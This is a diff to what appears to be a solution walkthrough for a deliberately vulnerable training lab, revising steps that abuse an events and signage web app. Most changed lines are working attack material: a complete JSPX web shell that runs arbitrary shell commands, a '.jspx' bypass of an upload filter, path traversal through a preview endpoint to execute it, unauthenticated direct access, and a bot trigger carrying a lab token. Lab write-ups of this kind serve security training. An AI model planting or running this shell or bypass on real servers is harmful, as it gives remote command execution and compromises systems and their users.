@@ -132,8 +132,10 @@ trusted verbatim. The published event's page/API exposes its invite code.
    ```bash
    $RC request --jar /tmp/atk.jar api/events
    # event 1 "Fall Fest 2026" ... "invite_code":"INV-FALLFEST-2026"
-   # event 3 "Career Fair" is the other published event (event 2 is an
-   # unpublished draft, so it does not appear in this list)
+   # published events are 1, 3-7 and 9-14 (4 "Open-Air Cinema Night" with
+   # INV-CINEMA-2026, 7 "Sustainability Week Kickoff" with INV-SUSTAIN-2026,
+   # the rest carry no invite code). Draft events 2 and 8 do not appear
+   # in this list.
    ```
 
 2. **Legitimate join first** (volunteer, event 1 — the intended use):
@@ -207,7 +209,7 @@ human administrator reviewing content.
 
    ```bash
    curl -s localhost:5000/status        # job done + screenshot path
-   ls bot/screenshots/                  # review-3-<timestamp>.png
+   ls screenshots/                      # review-3-<timestamp>.png (bind-mounted)
    ```
 
    The screenshot shows the review page with the red
@@ -229,29 +231,33 @@ human administrator reviewing content.
 
 Two flaws combine: (a) the signage-template uploader accepts **any**
 filename/bytes and writes into the web-accessible `uploads/templates/`
-directory. A hard-mode filter blocks `.jsp` extensions, but alternative
-JSP extensions such as `.jspf` or `.jspx` bypass it — Tomcat compiles and
-serves them; (b) the template preview endpoint forwards the user-supplied
-path straight to `RequestDispatcher.forward()` with no canonicalisation or
-allow-listing, so `..` segments walk anywhere inside the context.
+directory. A hard-mode filter blocks `.jsp` extensions, but `.jspx` bypasses
+it — `conf/web.xml` maps `*.jsp` and `*.jspx` to Tomcat's JspServlet, so a
+`.jspx` file is compiled and executed (`.jspf` also passes the upload filter
+but is **not** servlet-mapped, so it is only ever served as plain text);
+(b) the template preview endpoint forwards the user-supplied path straight
+to `RequestDispatcher.forward()` with no canonicalisation or allow-listing,
+so `..` segments walk anywhere inside the context.
 
 1. **Upload a JSP shell** using an extension that bypasses the `.jsp`
    filter (admin UI or API). The filter only checks
-   `lowerFilename.endsWith(".jsp")`, so `.jspf` (JSP fragment), `.jspx`,
-   or double extensions like `shell.jsp.jpg` pass through:
+   `lowerFilename.endsWith(".jsp")`, so `shell.jspx` passes through.
+   Note `.jspx` is parsed as XML — classic `<% %>` scriptlets fail there;
+   use the `jsp:` XML syntax with fully-qualified class names:
 
    ```bash
-   cat > /tmp/shell.jspf <<'EOF'
-   <%@ page import="java.io.*" %><%
-   String cmd = request.getParameter("cmd");
-   if (cmd != null) {
-     Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});
-     BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
-     String line; while ((line = r.readLine()) != null) out.println(line);
-   }%>
+   cat > /tmp/shell.jspx <<'EOF'
+   <jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
+   <jsp:directive.page contentType="text/plain"/>
+   <jsp:scriptlet>
+   java.io.BufferedReader r = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",request.getParameter("cmd")}).getInputStream()));
+   String line;
+   while ((line = r.readLine()) != null) { out.println(line); }
+   </jsp:scriptlet>
+   </jsp:root>
    EOF
    $RC request --jar /tmp/atk.jar \
-     --data "{\"filename\":\"shell.jspf\",\"content_b64\":\"$(base64 -w0 /tmp/shell.jspf)\"}" \
+     --data "{\"filename\":\"shell.jspx\",\"content_b64\":\"$(base64 -w0 /tmp/shell.jspx)\"}" \
      api/admin/templates
    ```
 
@@ -262,16 +268,16 @@ allow-listing, so `..` segments walk anywhere inside the context.
 
    ```bash
    $RC request --jar /tmp/atk.jar \
-     "admin/templates/preview?path=/uploads/../uploads/templates/shell.jspf&cmd=id"
-   # uid=0(root) gid=0(root) groups=0(root)
+     "admin/templates/preview?path=/uploads/../uploads/templates/shell.jspx&cmd=id"
+   # uid=999(tomcat) gid=999(tomcat) groups=999(tomcat)
    ```
 
 3. **Bonus route** — because the upload directory is web-accessible, the
    shell also answers directly, no session at all:
 
    ```bash
-   $RC request "uploads/templates/shell.jspf?cmd=id"
-   # uid=0(root) gid=0(root) groups=0(root)
+   $RC request "uploads/templates/shell.jspx?cmd=id"
+   # uid=999(tomcat) gid=999(tomcat) groups=999(tomcat)
    ```
 
 ---
@@ -291,7 +297,7 @@ allow-listing, so `..` segments walk anywhere inside the context.
 - **Bot did not run** — `docker compose logs bot`; check
   `curl localhost:5000/status`. Jobs only make sense for events in
   `pending_review` state; re-trigger manually with
-  `curl -X POST localhost:5000/review -d '{"event_id":3}'`.
+  `curl -X POST localhost:5000/review -H 'X-Bot-Token: lab-bot-token-890d7ba8d41377626cceaa03f0ab67f1b245d8b6e57d156f66a0e7092b62f3cf' -d '{"event_id":3}'`.
 - **Garbled API output** — you skipped the envelope: all body-carrying calls
   must go through `rc4cli.py` (or your own RC4 wrapper with the static key).
 - **Preview returns blank** — check `docker compose logs web`; if the
